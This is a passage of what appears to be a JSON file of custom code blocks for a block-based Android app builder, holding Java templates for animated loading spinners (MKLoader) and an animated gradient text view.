0);\n\t\t\t\t\t\tcircles[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\n\t\t\tpublic abstract class LoaderView {\n\t\t\t\tprotected int color;\n\t\t\t\tprotected int width, height;\n\t\t\t\tprotected int desiredWidth, desiredHeight;\n\t\t\t\tprotected PointF center;\n\t\t\t\tprotected InvalidateListener invalidateListener;\n\n\t\t\t\tpublic LoaderView() {\n\t\t\t\t\tthis.desiredWidth \u003d 150;\n\t\t\t\t\tthis.desiredHeight \u003d 150;\n\t\t\t\t}\n\n\t\t\t\tpublic void setColor(int color) {\n\t\t\t\t\tthis.color \u003d color;\n\t\t\t\t}\n\n\t\t\t\tpublic void setSize(int width, int height) {\n\t\t\t\t\tthis.width \u003d width;\n\t\t\t\t\tthis.height \u003d height;\n\t\t\t\t\tthis.center \u003d new PointF(width / 2.0f, height / 2.0f);\n\t\t\t\t}\n\n\t\t\t\tpublic void setInvalidateListener(InvalidateListener invalidateListener) {\n\t\t\t\t\tthis.invalidateListener \u003d invalidateListener;\n\t\t\t\t}\n\n\t\t\t\tpublic int getDesiredWidth() {\n\t\t\t\t\treturn desiredWidth;\n\t\t\t\t}\n\n\t\t\t\tpublic int getDesiredHeight() {\n\t\t\t\t\treturn desiredHeight;\n\t\t\t\t}\n\n\t\t\t\tpublic abstract void initializeObjects();\n\n\t\t\t\tpublic abstract void setUpAnimation();\n\n\t\t\t\tpublic abstract void draw(android.graphics.Canvas canvas);\n\n\t\t\t\tpublic boolean isDetached() {\n\t\t\t\t\treturn invalidateListener \u003d\u003d null;\n\t\t\t\t}\n\n\t\t\t\tpublic void onDetach() {\n\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\tinvalidateListener \u003d null;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic static class LoaderGenerator {\n\t\t\t\tpublic static LoaderView generateLoaderView(int type) {\n\t\t\t\t\t%1$s aan \u003d new %1$s();\n\t\t\t\t\tswitch (type) {\n\t\t\t\t\t\tcase 0:\n\t\t\t\t\t\t\treturn aan.new ClassicSpinner();\n\t\t\t\t\t\tcase 1:\n\t\t\t\t\t\t\treturn aan.new FishSpinner();\n\t\t\t\t\t\tcase 2:\n\t\t\t\t\t\t\treturn aan.new LineSpinner();\n\t\t\t\t\t\tcase 3:\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\treturn aan.new Pulse(3);\n\t\t\t\t\t\t\t} catch (InvalidNumberOfPulseException e) {\n\t\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcase 4:\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\treturn aan.new Pulse(4);\n\t\t\t\t\t\t\t} catch (InvalidNumberOfPulseException e) {\n\t\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcase 5:\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\treturn aan.new Pulse(5);\n\t\t\t\t\t\t\t} catch (InvalidNumberOfPulseException e) {\n\t\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcase 6:\n\t\t\t\t\t\t\treturn aan.new Radar();\n\t\t\t\t\t\tcase 7:\n\t\t\t\t\t\t\treturn aan.new TwinFishesSpinner();\n\t\t\t\t\t\tcase 8:\n\t\t\t\t\t\t\treturn aan.new Worm();\n\t\t\t\t\t\tcase 9:\n\t\t\t\t\t\t\treturn aan.new Whirlpool();\n\t\t\t\t\t\tcase 10:\n\t\t\t\t\t\t\treturn aan.new PhoneWave();\n\t\t\t\t\t\tcase 11:\n\t\t\t\t\t\t\treturn aan.new Sharingan();\n\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t\treturn aan.new ClassicSpinner();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tpublic static LoaderView generateLoaderView(String type) {\n\t\t\t\t\t%1$s aan \u003d new %1$s();\n\t\t\t\t\tswitch (type) {\n\t\t\t\t\t\tcase \"ClassicSpinner\":\n\t\t\t\t\t\t\treturn aan.new ClassicSpinner();\n\t\t\t\t\t\tcase \"FishSpinner\":\n\t\t\t\t\t\t\treturn aan.new FishSpinner();\n\t\t\t\t\t\tcase \"LineSpinner\":\n\t\t\t\t\t\t\treturn aan.new LineSpinner();\n\t\t\t\t\t\tcase \"ThreePulse\":\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\treturn aan.new Pulse(3);\n\t\t\t\t\t\t\t} catch (InvalidNumberOfPulseException e) {\n\t\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcase \"FourPulse\":\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\treturn aan.new Pulse(4);\n\t\t\t\t\t\t\t} catch (InvalidNumberOfPulseException e) {\n\t\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcase \"FivePulse\":\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\treturn aan.new Pulse(5);\n\t\t\t\t\t\t\t} catch (InvalidNumberOfPulseException e) {\n\t\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcase \"Radar\":\n\t\t\t\t\t\t\treturn aan.new Radar();\n\t\t\t\t\t\tcase \"TwinFishesSpinner\":\n\t\t\t\t\t\t\treturn aan.new TwinFishesSpinner();\n\t\t\t\t\t\tcase \"Worm\":\n\t\t\t\t\t\t\treturn aan.new Worm();\n\t\t\t\t\t\tcase \"Whirlpool\":\n\t\t\t\t\t\t\treturn aan.new Whirlpool();\n\t\t\t\t\t\tcase \"PhoneWave\":\n\t\t\t\t\t\t\treturn aan.new PhoneWave();\n\t\t\t\t\t\tcase \"Sharingan\":\n\t\t\t\t\t\t\treturn aan.new Sharingan();\n\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t\treturn aan.new ClassicSpinner();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class MKLoader extends View implements InvalidateListener {\n\t\t\t\tprivate int setLoaderType;\n\t\t\t\tprivate int setLoaderColor;\n\t\t\t\tprivate LoaderView loaderView;\n\n\t\t\t\tpublic MKLoader(Context context) {\n\t\t\t\t\tsuper(context);\n\t\t\t\t\tinitialize(context, null, 0);\n\t\t\t\t}\n\n\t\t\t\tpublic MKLoader(Context context, android.util.AttributeSet attrs) {\n\t\t\t\t\tsuper(context, attrs);\n\t\t\t\t\tinitialize(context, attrs, 0);\n\t\t\t\t}\n\n\t\t\t\tpublic MKLoader(Context context, android.util.AttributeSet attrs, int defStyleAttr) {\n\t\t\t\t\tsuper(context, attrs, defStyleAttr);\n\t\t\t\t\tinitialize(context, attrs, defStyleAttr);\n\t\t\t\t}\n\n\t\t\t\tprivate void initialize(Context context, android.util.AttributeSet attrs, int defStyleAttr) {\n\t\t\t\t\t//TypedArray typedArray \u003d context.obtainStyledAttributes(attrs, R.styleable.MKLoader);\n\t\t\t\t\t//int loaderType \u003d typedArray.getInt(R.styleable.MKLoader_mk_type,-1);\n\t\t\t\t\t//int loaderType \u003d -1;\n\t\t\t\t\t//loaderView \u003d LoaderGenerator.generateLoaderView(setLoaderType);\n\t\t\t\t\t//loaderView.setColor(Color.parseColor(\"#ffffff\"));\n\t\t\t\t\t//loaderView.setColor(typedArray.getColor(R.styleable.MKLoader_mk_color, Color.parseColor(\"#ffffff\")));\n\t\t\t\t\t//typedArray.recycle();\n\t\t\t\t}\n\n\t\t\t\tpublic void setType(int _type) {\n\t\t\t\t\tthis.setLoaderType \u003d _type;\n\t\t\t\t\tloaderView \u003d LoaderGenerator.generateLoaderView(setLoaderType);\n\t\t\t\t}\n\t\t\t\tpublic void setColor(int _color) {\n\t\t\t\t\tthis.setLoaderColor \u003d _color;\n\t\t\t\t\tloaderView.setColor(setLoaderColor);\n\t\t\t\t}\n\n\t\t\t\t@Override protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {\n\t\t\t\t\tfinal int measuredWidth \u003d resolveSize(loaderView.getDesiredWidth(), widthMeasureSpec);\n\t\t\t\t\tfinal int measuredHeight \u003d resolveSize(loaderView.getDesiredHeight(), heightMeasureSpec);\n\n\t\t\t\t\tsetMeasuredDimension(measuredWidth, measuredHeight);\n\t\t\t\t}\n\n\t\t\t\t@Override protected void onLayout(boolean changed, int left, int top, int right, int bottom) {\n\t\t\t\t\tsuper.onLayout(changed, left, top, right, bottom);\n\t\t\t\t\tloaderView.setSize(getWidth(), getHeight());\n\t\t\t\t\tloaderView.initializeObjects();\n\t\t\t\t\tloaderView.setUpAnimation();\n\t\t\t\t}\n\n\t\t\t\t@Override protected void onDraw(android.graphics.Canvas canvas) {\n\t\t\t\t\tsuper.onDraw(canvas);\n\t\t\t\t\tloaderView.draw(canvas);\n\t\t\t\t}\n\n\t\t\t\t@Override public void reDraw() {\n\t\t\t\t\tinvalidate();\n\t\t\t\t}\n\n\t\t\t\t@Override protected void onAttachedToWindow() {\n\t\t\t\t\tsuper.onAttachedToWindow();\n\t\t\t\t\tif (loaderView !\u003d null \u0026\u0026 loaderView.isDetached()) {\n\t\t\t\t\t\tloaderView.setInvalidateListener(this);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override protected void onDetachedFromWindow() {\n\t\t\t\t\tsuper.onDetachedFromWindow();\n\t\t\t\t\tif (loaderView !\u003d null) {\n\t\t\t\t\t\tloaderView.onDetach();\n\t\t\t\t\t}\n\t\t\t\t}","color":"#CAC319","name":"MKLoaderLibrary","typeName":"","palette":"58","type":" ","spec":"\u003e\u003e\u003e\u003e\u003e %m.activity % %s.inputOnly MKLoaderLibrary \u003c\u003c\u003c\u003c"},{"code":"{final MKLoader ag \u003d new MKLoader(%2$s.this);\nag.setLayoutParams(new LinearLayout.LayoutParams(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT));\nag.setType(%3$s); //0-11\nag.setColor(%4$s);\n%1$s.addView(ag);}","color":"#CAC319","name":"addMKLoader","typeName":"","palette":"58","type":" ","spec":"%m.view addMKLoader %m.activity type(0-11) %d  color %m.color"},{"code":"}\npublic class AnimatedGradientTextView extends TextView {\n    GradientManager gradientManager;\n    public String fonts;\n    public int[] colors;\n    public int simul;\n    public int angle;\n    public int speed;\n    public int maxFPS;\n    public AnimatedGradientTextView(Context context) {\n        super(context);\n        gradientManager \u003d new GradientManager(this);\n    }\n    public AnimatedGradientTextView(Context context, AttributeSet attrs) {\n        super(context, attrs);\n        gradientManager \u003d new GradientManager(this, colors, simul, angle, speed, maxFPS);\n        CustomFontManager.applyFontFromAttrs(this, fonts);\n    }\n    public AnimatedGradientTextView(Context context, AttributeSet attrs, int defStyle) {\n        super(context, attrs, defStyle);\n        gradientManager \u003d new GradientManager(this, colors, simul, angle, speed, maxFPS);\n        CustomFontManager.applyFontFromAttrs(this, fonts);\n    }\n    @Override\n    protected void onSizeChanged(int w, int h, int oldw, int oldh) {\n        super.onSizeChanged(w, h, oldw, oldh);\n        gradientManager.stopGradient();\n        gradientManager.startGradient();\n    }\n    @Override\n    protected void onVisibilityChanged(View changedView, int visibility) {\n        super.onVisibilityChanged(changedView, visibility);\n        if (visibility \u003d\u003d VISIBLE) {\n            if (getScaleX() !\u003d 0 \u0026\u0026 getScaleY() !\u003d 0) {\n                gradientManager.startGradient();\n            }\n        } else {\n            gradientManager.stopGradient();\n        }\n    }\n    @Override\n    protected void onWindowVisibilityChanged(int visibility) {\n        super.onWindowVisibilityChanged(visibility);\n        if (visibility \u003d\u003d VISIBLE) {\n            if (getScaleX() !\u003d 0 \u0026\u0026 getScaleY() !\u003d 0) {\n                gradientManager.startGradient();\n            }\n        } else {\n            gradientManager.stopGradient();\n        }\n    }\n    @Override\n    public void onScreenStateChanged(int screenState) {\n        super.onScreenStateChanged(screenState);\n        if (screenState \u003d\u003d SCREEN_STATE_OFF) {\n            gradientManager.stopGradient();\n        } else if (screenState \u003d\u003d SCREEN_STATE_ON) {\n            gradientManager.startGradient();\n        }\n    }\n    public void setFonts(String _font) {\n    \tfonts \u003d _font;\n    \tCustomFontManager.applyFontFromAttrs(this, _font);\n    }\n    public void setColorGradients(int[] _color) {\n    \tcolors \u003d _color;\n    \tgradientManager.setColors(_color);\n    }\n    public void setSimultaneousColors(int _sim) {\n    \tsimul \u003d _sim;\n    \tgradientManager.setSimultaneousColors(_sim);\n    }\n    public void setAngle(int _ang) {\n    \tangle \u003d _ang;\n    \tgradientManager.setAngle(_ang);\n    }\n    public void setSpeed(int _spd) {\n    \tspeed \u003d _spd;\n    \tgradientManager.setSpeed(_spd);\n    }\n    public void setMaxFPS(int _fps) {\n    \tmaxFPS \u003d _fps;\n    \tgradientManager.setMaxFPS(_fps);\n    }\n}\n\n\npublic static class CustomFontManager {\n    private static final String FONT_FILE_NAME \u003d \"fonts/\";\n    public static String fonts \u003d \"\";\n    private CustomFontManager() {\n\n    }\n    public static void applyFontFromAttrs(TextView textView, String _fonts) {\n        String fontName \u003d _fonts;\n        if(fontName !\u003d null) {\n            Typeface font \u003d Typeface.createFromAsset(textView.getContext().getAssets(), FONT_FILE_NAME + fontName);\n            textView.setTypeface(font);\n        }\n    }\n    public static void setFonts(String _font) {\n    \tfonts \u003d _font;\n    }\n}\n\n\npublic static class GradientManager {\n    private final TextView textView;\n    public static int[] colors \u003d new int[]{Color.BLUE, Color.RED, Color.GREEN};\n    public static int simultaneousColors \u003d 2;\n    public static int angle \u003d 45;\n    public static int speed \u003d 1000;\n    public static int maxFPS \u003d 24;\n    public static int drawTimeInterval;\n    private GradientRunnable runnable;\n    private java.util.concurrent.ScheduledFuture\u003c?\u003e scheduledFuture \u003d null;\n    private long currentGradientProgress \u003d 0;\n    private static final int ATTR_NOT_FOUND \u003d Integer.MIN_VALUE;\n    public GradientManager(TextView textView) {\n        this.textView \u003d textView;\n        this.initDefaultValues();\n    }\n    public GradientManager(TextView textView, int[] _colors, int _simul, int _angle, int _speed, int _maxFPS) {\n        this.textView \u003d textView;\n        this.initFromAttrsValues(_colors, _simul, _angle, _speed, _maxFPS);\n    }\n    @SuppressWarnings(\"ResourceType\")\n    private void initFromAttrsValues(int[] _colors, int _simul, int _angle, int _speed, int _maxFPS) {\n    \tcolors \u003d _colors;\n        simultaneousColors \u003d _simul;\n        angle \u003d _angle;\n        speed \u003d _speed;\n        maxFPS \u003d _maxFPS;\n        drawTimeInterval \u003d 1000 / maxFPS;\n    }\n    private void initDefaultValues() {\n        colors \u003d colors;\n        simultaneousColors \u003d simultaneousColors;\n        angle \u003d angle;\n        speed \u003d speed;\n        maxFPS \u003d maxFPS;\n        drawTimeInterval \u003d 1000 / maxFPS;\n    }\n    public void stopGradient() {\n        synchronized (this) {\n            if (scheduledFuture !\u003d null) {\n                currentGradientProgress \u003d runnable.getCurrentProgress();\n                scheduledFuture.cancel(true);\n                runnable \u003d null;\n                scheduledFuture \u003d null;\n            }\n        }\n    }\n    public void startGradient() {\n        synchronized (this) {\n            if (scheduledFuture !\u003d null) {\n                return;\n            }\n            final int wf \u003d textView.getWidth();\n            final int hf \u003d textView.getHeight();\n            if (wf \u003e 0 \u0026\u0026 hf \u003e 0) {\n                runnable \u003d new GradientRunnable(textView, colors, simultaneousColors, angle, speed);\n                runnable.setCurrentProgress(currentGradientProgress);\n                java.util.concurrent.ScheduledExecutorService scheduledExecutor \u003d java.util.concurrent.Executors.newSingleThreadScheduledExecutor();\n                scheduledFuture \u003d scheduledExecutor.scheduleAtFixedRate(runnable, 0, drawTimeInterval, java.util.concurrent.TimeUnit.MILLISECONDS);\n            }\n        }\n    }\n    public static void setColors(int[] _col) {\n    \tcolors \u003d _col;\n    }\n    public static void setSimultaneousColors(int _sim) {\n    \tsimultaneousColors \u003d _sim;\n    }\n    public static void setAngle(int _ang) {\n    \tangle \u003d _ang;\n    }\n    public static void setSpeed(int _spd) {\n    \tspeed \u003d _spd;\n    }\n    public static void setMaxFPS(int _fps) {\n    \tmaxFPS \u003d _fps;\n    }\n}\n\n\npublic static class GradientRunnable implements Runnable {\n    private final TextView textView;\n    private int[] colors;\n    private int angle;\n    private int speed;\n    private long totalDelta \u003d 0;\n    private long lastTime \u003d 0;\n    private int[] currentColors;\n    private Point[] gradientsPositions;\n    private int currentGradient \u003d 0;\n    GradientRunnable(TextView textView, int[] colors, int simultaneousColors, int angle, int speed) {\n        this.textView \u003d textView;\n        this.colors \u003d colors;\n        this.angle \u003d angle;\n        this.speed \u003d speed;\n        final int wf \u003d textView.getWidth();\n        final int hf \u003d textView.getHeight();\n        gradientsPositions \u003d getGradientsPoints(wf, hf);\n        currentColors \u003d Arrays.copyOf(colors, simultaneousColors);\n    }\n    @Override\n    public void run() {\n        long currentTime \u003d SystemClock.uptimeMillis();\n        long delta \u003d currentTime - lastTime;\n        totalDelta +\u003d delta;\n        float totalPercentage \u003d totalDelta / ((float) speed);\n        totalPercentage \u003d totalPercentage \u003e 1 ? 1 : totalPercentage;\n        for (int colorIndex \u003d 0; colorIndex \u003c currentColors.length; colorIndex++) {\n            currentColors[colorIndex] \u003d (int) (new ArgbEvaluator().evaluate(totalPercentage, colors[(currentGradient + colorIndex) %1$s colors.length], colors[(currentGradient + (colorIndex + 1)) %1$s colors.length]));\n        }\n        if (totalPercentage \u003d\u003d 1) {\n            totalDelta \u003d 0;\n            currentGradient \u003d (currentGradient + 1) %1$s colors.length;\n        }\n        Shader shader \u003d new LinearGradient(gradientsPositions[0].x, gradientsPositions[0].y, gradientsPositions[1].x, gradientsPositions[1].y, currentColors, null, Shader.TileMode.CLAMP);\n        textView.getPaint().setShader(shader);\n        textView.postInvalidate();\n        lastTime \u003d currentTime;\n    }\n    private Point[] getGradientsPoints(int width, int height) {\n        double angleRadian \u003d Math.toRadians(angle);\n        int circleRadius \u003d width;\n        Point circleCenter \u003d new Point(width / 2, height / 2);\n        Point secantP1 \u003d new Point((int) (circleCenter.x - circleRadius * Math.cos(angleRadian)), (int) (circleCenter.y - circleRadius * Math.sin(angleRadian)));\n        Point secantP2 \u003d new Point((int) (circleCenter.x + circleRadius * Math.cos(angleRadian)), (int) (circleCenter.y + circleRadius * Math.sin(angleRadian)));\n        Point[] intersectPoints \u003d new Point[2];\n        Point topSegmentP1 \u003d new Point(0, 0);\n        Point topSegmentP2 \u003d new Point(width, 0);\n        intersectPoints[0] \u003d MathsUtils.getIntersectionPoint(secantP1, secantP2, topSegmentP1, topSegmentP2);\n        if (intersectPoints[0] \u003d\u003d null) {\n            Point leftSegmentP1 \u003d new Point(0, 0);\n            Point leftSegmentP2 \u003d new Point(0, height);\n            intersectPoints[0] \u003d MathsUtils.getIntersectionPoint(secantP1, secantP2, leftSegmentP1, leftSegmentP2);\n        }\n        Point bottomSegmentP1 \u003d new Point(0, height);\n        Point bottomSegmentP2 \u003d new Point(width, height);\n        intersectPoints[1] \u003d MathsUtils.getIntersectionPoint(secantP1, secantP2, bottomSegmentP1, bottomSegmentP2);\n        if (intersectPoints[1] \u003d\u003d null) {\n            Point rightSegmentP1 \u003d new Point(width, 0);\n            Point rightSegmentP2 \u003d new Point(width, height);\n            intersectPoints[1] \u003d MathsUtils.getIntersectionPoint(secantP1, secantP2, rightSegmentP1, rightSegmentP2);\n        }\n        return intersectPoints;\n    }\n    public long getCurrentProgress() {\n        return totalDelta;\n    }\n    public void setCurrentProgress(long progress) {\n        this.totalDelta \u003d progress;\n    }\n}\n\n\npublic static class MathsUtils {\n    private MathsUtils() {\n    }\n    static Point getIntersectionPoint(Point p1, Point p2, Point p3, Point p4) {\n        int d \u003d (p1.x - p2.x) * (p3.y - p4.y) - (p1.y - p2.y) * (p3.x - p4.x);\n        if (d \u003d\u003d 0) return null;\n        int x \u003d ((p3.x - p4.x) * (p1.x * p2.y - p1.y * p2.x) - (p1.x - p2.x) * (p3.x * p4.y - p3.y * p4.x)) / d;\n        int y \u003d ((p3.y - p4.y) * (p1.x * p2.y - p1.y * p2.x) - (p1.y - p2.y) * (p3.x * p4.y - p3.y * p4.x)) / d;\n        return new Point(x, y);\n    }","color":"#CAC319","name":"AnimatedGradientTextViewLibrary","typeName":"","palette":"58","type":" ","spec":"\u003e\u003e\u003e\u003e AnimatedGradientTextView Library % %s.inputOnly \u003c\u003c\u003c\u003c"},{"code":"%s","color":"#CAC319","name":"AnimatedGradientTextViewType","typeName":"AnimatedGradientTextView","palette":"58","type":"p","spec":"AGTV  %s.inputOnly"},{"code":"final AnimatedGradientTextView %1$s \u003d new AnimatedGradientTextView(%2$s.this);\n%1$s.setLayoutParams(new LinearLayout.LayoutParams(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT));","color":"#CAC319","name":"AnimatedGradientTextViewCreate","typeName":"AnimatedGradientTextView","palette":"58","type":" ","spec":"%s.inputOnly AnimatedGradientTextView Create %m.activity"},{"code":"%s.setText(%s);","color":"#CAC319","name":"AnimatedGradientTextViewSetText","typeName":"AnimatedGradientTextView","palette":"58","type":" ","spec":"%m.AnimatedGradientTextView setText %s"},{"code":"%s.setTextSize(%s);","color":"#CAC319","name":"AnimatedGradientTextViewSetTextSize","typeName":"AnimatedGradientTextView","palette":"58","type":" ","spec":"%m.AnimatedGradientTextView setTextSize %d"},{"code":"%s.setFonts(\"fonts/%s.ttf\");","color":"#CAC319","name":"AnimatedGradientTextViewSetFonts","typeName":"AnimatedGradientTextView","palette":"58","type":" ","spec":"%m.AnimatedGradientTextView setFonts %m.font"},{"code":"%s.setColorGradients(new int[]{%s});","color":"#CAC319","name":"AnimatedGradientTextViewSetColorGradients","typeName":"AnimatedGradientTextView","palette":"58","type":" ","spec":"%m.AnimatedGradientTextView setColorGradients %m.color"},{"code":"%s.setSimultaneousColors(%s);","color":"#CAC319","name":"AnimatedGradientTextViewSetSimultaneousColors","typeName":"AnimatedGradientTextView","palette":"58","type":" ","spec":"%m.AnimatedGradientTextView setSimultaneousColors %d"},{"code":"%s.setAngle(%s);","color":"#CAC319","name":"AnimatedGradientTextViewSetAngle","typeName":"AnimatedGradientTextView","palette":"58","type":" ","spec":"%m.AnimatedGradientTextView  setAngle %d"},{"code":"%s.setSpeed(%s);","color":"#CAC319","name":"AnimatedGradientTextViewSetSpeed","typeName":"AnimatedGradientTextView","palette":"58","type":" ","spec":"%m.AnimatedGradientTextView  setSpeed %d ms"},{"code":"%s.setMaxFPS(%s);","color":"#CAC319","name":"AnimatedGradientTextViewSetMaxFPS","typeName":"AnimatedGradientTextView","palette":"58","type":" ","spec":"%m.AnimatedGradientTextView  setMaxFPS %d"},{"code":"%s.addView(%s);","color":"#CAC319","name":"AnimatedGradientTextViewAddView","typeName":"AnimatedGradientTextView","palette":"58","type":" ","spec":"%m.view addView %m.AnimatedGradientTextView"},{"code":"%s ,%s","color":"#e92467","name":"color with color","typeName":"color","palette":"58","type":"p","spec":"%m.color with %m.color"},{"code":"\t\n\t\t\n}\n\t\t\tpublic class Arc extends GraphicObject {\n\t\t\t\tprivate android.graphics.RectF oval;\n\t\t\t\tprivate float startAngle;\n\t\t\t\tprivate float sweepAngle;\n\t\t\t\tprivate boolean useCenter;\n\n\t\t\t\tpublic void setOval(android.graphics.RectF oval) {\n\t\t\t\t\tthis.oval \u003d oval;\n\t\t\t\t}\n\n\t\t\t\tpublic void setStartAngle(float startAngle) {\n\t\t\t\t\tthis.startAngle \u003d startAngle;\n\t\t\t\t}\n\n\t\t\t\tpublic void setSweepAngle(float sweepAngle) {\n\t\t\t\t\tthis.sweepAngle \u003d sweepAngle;\n\t\t\t\t}\n\n\t\t\t\tpublic void setUseCenter(boolean useCenter) {\n\t\t\t\t\tthis.useCenter \u003d useCenter;\n\t\t\t\t}\n\n\t\t\t\tpublic float getStartAngle() {\n\t\t\t\t\treturn startAngle;\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tcanvas.drawArc(oval, startAngle, sweepAngle, useCenter, paint);\n\t\t\t\t}\n\t\t\t}\n\n\n\n\t\t\tpublic class Balloon extends LoaderView {\n\t\t\t\t@Override public void initializeObjects() {\n\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class Circle extends GraphicObject {\n\t\t\t\tprivate PointF center;\n\t\t\t\tprivate float radius;\n\n\t\t\t\tpublic Circle() {\n\t\t\t\t\tcenter \u003d new PointF();\n\t\t\t\t}\n\n\t\t\t\tpublic void setRadius(float radius) {\n\t\t\t\t\tthis.radius \u003d radius;\n\t\t\t\t}\n\n\t\t\t\tpublic void setCenter(float x, float y) {\n\t\t\t\t\tcenter.set(x, y);\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tcanvas.drawCircle(center.x, center.y, radius, paint);\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class ClassicSpinner extends LoaderView {\n\t\t\t\tprivate Circle[] circles;\n\t\t\t\tprivate int circlesSize;\n\n\t\t\t\tpublic ClassicSpinner() {\n\t\t\t\t\tcirclesSize \u003d 8;\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfinal float size \u003d Math.min(width, height);\n\t\t\t\t\tfinal float circleRadius \u003d size / 10.0f;\n\t\t\t\t\tcircles \u003d new Circle[circlesSize];\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c circlesSize; i++) {\n\t\t\t\t\t\tcircles[i] \u003d new Circle();\n\t\t\t\t\t\tcircles[i].setCenter(center.x, circleRadius);\n\t\t\t\t\t\tcircles[i].setColor(color);\n\t\t\t\t\t\tcircles[i].setAlpha(126);\n\t\t\t\t\t\tcircles[i].setRadius(circleRadius);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c circlesSize; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\n\t\t\t\t\t\tandroid.animation.ValueAnimator fadeAnimator \u003d android.animation.ValueAnimator.ofInt(126, 255, 126);\n\t\t\t\t\t\tfadeAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tfadeAnimator.setDuration(1000);\n\t\t\t\t\t\tfadeAnimator.setStartDelay(index * 120);\n\t\t\t\t\t\tfadeAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\tcircles[index].setAlpha((int)animation.getAnimatedValue());\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tfadeAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c circlesSize; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.rotate(45 * i, center.x, center.y);\n\t\t\t\t\t\tcircles[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class FishSpinner extends LoaderView {\n\t\t\t\tprivate Circle[] circles;\n\t\t\t\tprivate int numberOfCircle;\n\t\t\t\tprivate float[] rotates;\n\n\t\t\t\tpublic FishSpinner() {\n\t\t\t\t\tnumberOfCircle \u003d 5;\n\t\t\t\t\trotates \u003d new float[numberOfCircle];\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfinal float size \u003d Math.min(width, height);\n\t\t\t\t\tfinal float circleRadius \u003d size / 10.0f;\n\t\t\t\t\tcircles \u003d new Circle[numberOfCircle];\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfCircle; i++) {\n\t\t\t\t\t\tcircles[i] \u003d new Circle();\n\t\t\t\t\t\tcircles[i].setCenter(center.x, circleRadius);\n\t\t\t\t\t\tcircles[i].setColor(color);\n\t\t\t\t\t\tcircles[i].setRadius(circleRadius - circleRadius * i / 6);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfCircle; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\n\t\t\t\t\t\tandroid.animation.ValueAnimator fadeAnimator \u003d android.animation.ValueAnimator.ofFloat(0, 360);\n\t\t\t\t\t\tfadeAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tfadeAnimator.setDuration(1700);\n\t\t\t\t\t\tfadeAnimator.setStartDelay(index * 100);\n\t\t\t\t\t\tfadeAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\trotates[index] \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) 